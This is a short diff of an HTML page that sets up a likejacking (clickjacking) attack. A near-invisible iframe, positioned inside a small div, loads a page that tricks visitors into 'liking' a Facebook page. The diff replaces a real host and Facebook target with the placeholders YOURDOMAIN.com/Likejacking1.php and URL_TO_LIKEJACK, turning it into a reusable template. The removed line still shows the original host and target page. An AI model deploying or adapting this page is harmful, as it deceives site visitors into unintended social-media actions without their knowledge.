@@ -1,8 +1,8 @@
-<body>
+
 <style>body{margin:0px;padding:0px;}</style>
 
 <div style="overflow:hidden;width:100px;height:100px;position:relative;" id=v>
-<iframe id="cksl7" name="cksl7" src="http://idanraman.com/Trying/index.php?id=%22https://www.facebook.com/ElephantWalletIsrael/%22" style="border:0px;left:-1px;top:-1px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0.7;overflow:hidden;width:1920px;height:971px;"></iframe></div>
+<iframe id="cksl7" name="cksl7" src="http://YOURDOMAIN.com/Likejacking1.php?id=%22URL_TO_LIKEJACK%22" style="border:0px;left:-1px;top:-1px;position:absolute;filter:alpha(opacity=0);z-index:1;opacity:0.7;overflow:hidden;width:1920px;height:971px;"></iframe></div>
 
 <script>
 var d=document;
@@ -38,4 +38,3 @@ $(function(){
 });
 $(window).focus()
 </script>
-</body>
